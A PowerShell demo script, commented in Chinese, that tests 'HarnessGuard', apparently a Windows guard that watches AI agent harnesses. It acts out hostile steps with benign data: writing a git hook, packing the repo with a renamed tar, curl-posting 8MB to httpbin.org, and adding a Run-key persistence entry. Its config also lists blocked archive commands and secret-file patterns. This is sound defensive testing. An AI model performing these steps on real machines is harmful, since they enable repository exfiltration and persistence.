# HarnessGuard M1 端到端演示（需管理员 PowerShell 运行）
# 场景：A  .git 注入面读（hooks）→ git-dir Block 判定 + 通知（默认不杀，拍板记录 12/13）；
#       A2 树内真 git.exe status/commit → tool-exempt 豁免 + 工作流面放行（正向用例）；
#       A3 绝对路径 git.exe（模拟便携/非标准安装）→ 豁免按文件名匹配（正向用例）；
#       A4 harness 进程内直写 .git（模拟 isomorphic-git/nodegit 进程内库 IO 形态）
#          → 工作流面放行；注入面写 Block 判定 + 不杀（存活标记验证）；
#       B  evilpack(tar 副本) 命令封堵；B2 进程内创建归档产物（模拟 Node archiver 类库
#          无子进程打包）→ archive-create Block + 杀（打包双信号之信号 2）；
#       C  curl 上传 8MB 超 5MB 阈值断连接；D  RunKey 持久化告警；E  Web API 查证据。
#       场景 A-B2/C/D 均带 PASS/FAIL 断言输出。
# 说明：全部场景使用系统自带工具（cmd/tar/curl/git）模拟 harness 子进程行为；
#       不使用编码命令或裸 TCP 写（避免触发杀软 ML 误报——实测教训）。
# 复跑：powershell -ExecutionPolicy Bypass -File demos/m1-demo.ps1（产物在 target/demo/）

$ErrorActionPreference = 'Continue'
$root = "D:\develop\runlefei\HarnessGuard"
$demo = Join-Path $root "target\demo"
$exe  = Join-Path $root "target\release\harnessguard.exe"

"== HarnessGuard M1 演示 开始 $(Get-Date -Format HH:mm:ss) =="

# ---------- 0. 清场与造景 ----------
Stop-Process -Name harnessguard -Force -ErrorAction SilentlyContinue
Start-Sleep 1
Remove-Item -Recurse -Force $demo -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path "$demo\repo\.git" | Out-Null
Set-Content "$demo\repo\.git\config" "[core]`nrepositoryformatversion = 0"
# 注入面样本文件（hooks 下任意文件；git init 的 *.sample 同样适用，手工保证幂等）
New-Item -ItemType Directory -Force -Path "$demo\repo\.git\hooks" | Out-Null
Set-Content "$demo\repo\.git\hooks\pre-commit" "#!/bin/sh`ndemo-hook"
Set-Content "$demo\repo\.env" "SECRET=demo-secret"
Set-Content "$demo\repo\main.rs" "fn main() {}"
# git 可用性（A2/A3 正向用例前置；无 git 环境则跳过并提示）
$gitCmd = Get-Command git -ErrorAction SilentlyContinue
$gitExe = if ($gitCmd) { $gitCmd.Source } elseif (Test-Path "C:\Program Files\Git\cmd\git.exe") { "C:\Program Files\Git\cmd\git.exe" } else { $null }
if ($gitExe) {
  # 仓库真 git 化（PowerShell 在监控树外，init 不产生判定）
  & $gitExe -C "$demo\repo" init 2>&1 | Out-Null
  & $gitExe -C "$demo\repo" config user.email "hg@demo.local" 2>&1 | Out-Null
  & $gitExe -C "$demo\repo" config user.name "hg-demo" 2>&1 | Out-Null
} else {
  "[前置] 未找到 git.exe，跳过场景 A2/A3（正向豁免用例）"
}
# 8MB 全零载荷（fsutil 秒建；避免随机数据/大字符串拼接触发杀软或 PS 限制——实测教训）
fsutil file createnew "$demo\big.bin" 8388608 | Out-Null
Copy-Item "C:\Windows\System32\cmd.exe" "$demo\fake_harness.exe" -Force
Copy-Item "C:\Windows\System32\tar.exe" "$demo\evilpack.exe" -Force

# ---------- 1. 配置 ----------
@'
[network]
upload_threshold_mb = 5
sensitive_escalation_divisor = 10

[endpoints]
allow = ["api.anthropic.com", "*.github.com"]

[files]
git_dir_action = "block"
git_dir_kill = false
archive_action = "block"
sensitive_patterns = [".env", ".env.*", "*_rsa", "*.pem", "*credentials*"]
archive_patterns = ["*.zip", "*.tar", "*.tar.gz", "*.tgz", "*.7z", "*.gz", "*.zst"]

[commands]
blocked = ["git archive*", "git bundle*", "git format-patch*", "tar *", "zip *", "7z *", "gzip *", "zstd *", "evil*"]

[[processes.harness]]
name = "fake-harness"
paths = ["**/fake_harness.exe"]

[[tool_exempt]]
exe = "git"
allow_paths = [".git/**"]

[storage]
retention_days = 30
max_disk_mb = 500
db_path = "harnessguard.db"

[web]
bind = "127.0.0.1:8377"
'@ | Set-Content "$demo\config.toml" -Encoding ascii

# ---------- 2. 本地接收端（模拟外传目标，HttpListener 200） ----------
$u=[System.Net.Sockets.UdpClient]::new();$u.Connect("8.8.8.8",80);$lan=($u.Client.LocalEndPoint -as [System.Net.IPEndPoint]).Address.ToString();$u.Close()
$sinkScript = '$l=[System.Net.HttpListener]::new();$l.Prefixes.Add(''http://+:18080/'');$l.Start();try{while($true){$c=$l.GetContext();$s=$c.Request.InputStream;$b=New-Object byte[] 65536;while($s.Read($b,0,$b.Length) -gt 0){};$c.Response.StatusCode=200;$c.Response.Close()}}catch{}'
$sink = Start-Process powershell -ArgumentList '-NoProfile','-Command',$sinkScript -WindowStyle Hidden -PassThru

# ---------- 3. 启动 HarnessGuard ----------
$env:RUST_LOG = 'info,hg_plat_win=debug,hg_core=debug'
$svc = Start-Process $exe -ArgumentList "$demo\config.toml" -WorkingDirectory $demo `
    -WindowStyle Hidden -PassThru `
    -RedirectStandardOutput "$demo\svc.out.log" -RedirectStandardError "$demo\svc.err.log"
Start-Sleep 4
$token = $null
try { $token = (Select-String -Path "$demo\svc.out.log" -Pattern 'token=([0-9a-f]+)').Matches[0].Groups[1].Value } catch {}
if (-not $token) { "!! 服务未产出 token："; Get-Content "$demo\svc.out.log"; Get-Content "$demo\svc.err.log"; exit 1 }
"服务已启动 token=$token"
$H = @{ Authorization = "Bearer $token" }

# ---------- 4. 场景 A：注入面读（hooks）→ Block 判定 + 通知（默认不杀） ----------
"[场景 A] fake_harness(cmd) 读 repo\.git\hooks\pre-commit（期望：git-dir Block 判定 + 通知，默认不杀——Create 打开出 Audit，Block 由真实 Read 事件出，拍板记录 12/13/16）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "type repo\.git\hooks\pre-commit" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2

# 判定断言辅助：按 rule_id + action 统计 verdicts 总数（limit 200）。
# 默认只数 block（拍板记录 16：.git 的 Create 打开出 Audit 不出 Block，
# Block 由携带真实 access 的 Read/Write 事件出——断言须按 action 区分）。
function Get-RuleCount($h, $ruleId, $action = "block") {
  try {
    $vs = Invoke-RestMethod -Headers $h "http://127.0.0.1:8377/api/verdicts?limit=200"
    return @($vs | Where-Object { $_.rule_id -eq $ruleId -and $_.action -eq $action }).Count
  } catch { return -1 }
}
$aBlocks = Get-RuleCount $H "git-dir"
if ($aBlocks -ge 1) { "[断言 A] PASS：git-dir Block 判定 {0} 条" -f $aBlocks }
else { "[断言 A] FAIL：未见 git-dir Block（注入面读未命中？）" }

# ---------- 4a. 场景 A2：树内真 git.exe status/commit → 豁免 + 工作流面放行 ----------
if ($gitExe) {
  "[场景 A2] fake_harness 树内 git.exe add+commit（期望：无 git-dir Block，git-dir-workflow 首见放行，commit 成功——tool-exempt 正向用例）"
  Push-Location $demo
  & "$demo\fake_harness.exe" /c "git -C repo add main.rs & git -C repo commit -m hg-demo-commit" 2>&1 | Out-Null
  Pop-Location
  Start-Sleep 2
  $a2Blocks = Get-RuleCount $H "git-dir"
  if ($a2Blocks -eq $aBlocks) { "[断言 A2] PASS：git.exe 操作零新增 git-dir Block（{0} -> {1}）" -f $aBlocks, $a2Blocks }
  else { "[断言 A2] FAIL：git.exe 操作新增 git-dir Block {0} 条（豁免/工作流面未生效？）" -f ($a2Blocks - $aBlocks) }
  $a2Log = & $gitExe -C "$demo\repo" log --oneline -1 2>$null
  if ($a2Log -match "hg-demo-commit") { "[断言 A2] PASS：commit 成功（$a2Log）" }
  else { "[断言 A2] FAIL：commit 未落盘（$a2Log）" }
} else { "[场景 A2] SKIP（无 git.exe）" }

# ---------- 4b. 场景 A3：绝对路径 git.exe（便携/非标准安装形态）→ 按文件名豁免 ----------
if ($gitExe) {
  $absGit = $gitExe
  "[场景 A3] fake_harness 树内绝对路径 git.exe（$absGit，期望：豁免按文件名匹配，无 git-dir Block）"
  Push-Location $demo
  & "$demo\fake_harness.exe" /c "`"$absGit`" -C repo status --porcelain" 2>&1 | Out-Null
  Pop-Location
  Start-Sleep 2
  $a3Blocks = Get-RuleCount $H "git-dir"
  if ($a3Blocks -eq $aBlocks) { "[断言 A3] PASS：绝对路径 git.exe 零新增 Block" }
  else { "[断言 A3] FAIL：新增 {0} 条（mingw64/bin 等非 cmd 路径未豁免？）" -f ($a3Blocks - $aBlocks) }
} else { "[场景 A3] SKIP（无 git.exe）" }

# ---------- 4c. 场景 A4：进程内直写 .git（模拟 isomorphic-git/nodegit IO 形态） ----------
"[场景 A4] fake_harness(cmd) 进程内直写 .git（期望：objects/HEAD.lock 工作流面放行；hooks 写 Block 判定 + 不杀——同进程存活标记验证）"
Remove-Item "$demo\a4-alive.marker" -Force -ErrorAction SilentlyContinue
Push-Location $demo
# 工作流面：objects 写 + HEAD.lock 写（模拟进程内 git 库 commit 形态）
New-Item -ItemType Directory -Force -Path "$demo\repo\.git\objects\ab" | Out-Null
& "$demo\fake_harness.exe" /c "echo blob-demo > repo\.git\objects\ab\abcdef123456 & copy /y nul repo\.git\HEAD.lock > nul" 2>&1 | Out-Null
# 注入面写 + 同进程存活标记（默认不杀：marker 应存在）
& "$demo\fake_harness.exe" /c "echo evil-hook > repo\.git\hooks\hg-demo-evil.hook & echo alive > $demo\a4-alive.marker" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2
$a4Blocks = Get-RuleCount $H "git-dir"
if ($a4Blocks -gt $aBlocks) { "[断言 A4] PASS：注入面写产生 Block 判定（+{0}）" -f ($a4Blocks - $aBlocks) }
else { "[断言 A4] FAIL：注入面写未命中（{0} -> {1}）" -f $aBlocks, $a4Blocks }
if (Test-Path "$demo\a4-alive.marker") { "[断言 A4] PASS：触碰注入面后进程存活（默认不杀，git_dir_kill=false）" }
else { "[断言 A4] FAIL：进程被杀（git_dir_kill 应为 false——检查配置）" }

# ---------- 5. 场景 B：evilpack(tar 副本) 命令封堵 + 杀 ----------
"[场景 B] fake_harness 树内 evilpack.exe 打包 repo（期望：cmd-block Block + 杀进程）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "$demo\evilpack.exe -czf out.tar.gz repo" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2
$bCmd = Get-RuleCount $H "cmd-block"
if ($bCmd -ge 1) { "[断言 B] PASS：cmd-block Block 判定 {0} 条" -f $bCmd }
else { "[断言 B] FAIL：未见 cmd-block（命令封堵未命中？）" }

# ---------- 5a. 场景 B2：进程内创建归档产物（无独立子进程，模拟 Node archiver 类库打包） ----------
"[场景 B2] fake_harness(cmd) 进程内直接写 out2.zip（期望：archive-create Block + 杀进程——打包双信号之信号 2，需求 §3.1）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "echo fake-zip-content > out2.zip" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2
$b2Arch = Get-RuleCount $H "archive-create"
if ($b2Arch -ge 1) { "[断言 B2] PASS：archive-create Block 判定 {0} 条（进程内打包产物被捕获）" -f $b2Arch }
else { "[断言 B2] FAIL：未见 archive-create（产物创建信号未生效？）" }

# ---------- 6. 场景 C：树内 curl 上传 8MB（>5MB 阈值）→ 断连接 + 杀 ----------
"[场景 C] fake_harness 树内 curl POST 8MB 到 httpbin.org（真实外部端点——本机自连/回环的大流量 send 均不产生 TCP-IP 事件，实测教训）（期望：net-threshold Block + 断连接 + 封目标 IP）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "curl -s -m 25 --data-binary @big.bin http://httpbin.org/post" 2>&1 | Out-Null
Pop-Location
Start-Sleep 3
$cNet = Get-RuleCount $H "net-threshold"
if ($cNet -ge 1) { "[断言 C] PASS：net-threshold Block 判定 {0} 条（断连接 + 封 IP 由 /api/status 与系统侧核对）" -f $cNet }
else { "[断言 C] FAIL：未见 net-threshold（外传阈值未触发？检查外网连通性——httpbin.org 不可达时本场景依赖外部端点）" }

# ---------- 7. 场景 D：RunKey 持久化（轮询 30s） ----------
"[场景 D] 写入 HKCU RunKey（期望：persistence Audit 告警，~30s 内）"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HgDemo /d "cmd /c echo hi" /f | Out-Null
Start-Sleep 35
$dPers = Get-RuleCount $H "persistence" "audit"
if ($dPers -ge 1) { "[断言 D] PASS：persistence Audit 告警 {0} 条" -f $dPers }
else { "[断言 D] FAIL：未见 persistence（轮询窗口内未检出？）" }

# ---------- 8. 场景 E：API 查证据 ----------
"[场景 E] /api/status"
try { (Invoke-RestMethod -Headers $H "http://127.0.0.1:8377/api/status") | ConvertTo-Json -Depth 4 } catch { "status 查询失败：$_" }
"`n[场景 E] /api/verdicts（UI Dashboard 同数据源）"
try {
  $vs = Invoke-RestMethod -Headers $H "http://127.0.0.1:8377/api/verdicts?limit=20"
  $vs | ForEach-Object { "{0}  {1,-8} {2,-15} pid={3,-6} {4}" -f ([DateTimeOffset]::FromUnixTimeMilliseconds($_.ts).LocalDateTime.ToString("HH:mm:ss")), $_.action, $_.rule_id, $_.pid, $_.evidence.summary }
  "共 $($vs.Count) 条判定（详细证据 JSON 可在 Web UI 点击行查看）"
} catch { "verdicts 查询失败：$_" }

# ---------- 8.5 日志副本 ----------
Copy-Item "$demo\svc.out.log" "$demo\svc.last.log" -Force

# ---------- 9. 清场 ----------
Stop-Process -Id $svc.Id -Force -ErrorAction SilentlyContinue
Stop-Process -Id $sink.Id -Force -ErrorAction SilentlyContinue
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HgDemo /f 2>$null | Out-Null
"`n== 演示结束 $(Get-Date -Format HH:mm:ss)（复跑请重新执行本脚本）=="
